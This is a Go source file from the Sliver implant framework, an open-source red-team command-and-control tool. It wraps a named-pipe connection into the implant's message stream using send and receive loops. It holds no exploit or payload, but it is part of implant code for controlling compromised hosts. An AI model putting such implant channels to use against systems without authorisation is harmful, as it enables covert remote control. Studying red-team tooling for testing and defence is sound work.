package namedpipe

import (
	"io"
	"log"
	"net"

	"github.com/bishopfox/sliver/implant/sliver/transports"
)

/*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// SetupConnectionNamedPipe - Wraps a Named Pipe connection into a logical Connection stream.
// The generic SetupConnectionStream is not used, due to Read and Write functions being slightly different.
func SetupConnectionNamedPipe(conn net.Conn, userCleanup func()) (*transports.Connection, error) {

	connection := transports.NewConnection()

	go func() {
		defer connection.Cleanup()
		for envelope := range connection.Send {
			// {{if .Config.Debug}}
			log.Printf("[namedpipe] send loop envelope type %d\n", envelope.Type)
			// {{end}}
			writeEnvelope(&conn, envelope)
		}
	}()

	go func() {
		defer connection.Cleanup()
		for {
			envelope, err := readEnvelope(&conn)
			if err == io.EOF {
				break
			}
			if err == nil {
				connection.Recv <- envelope
				// {{if .Config.Debug}}
				log.Printf("[namedpipe] Receive loop envelope type %d\n", envelope.Type)
				// {{end}}
			}
		}
	}()

	return connection, nil
}
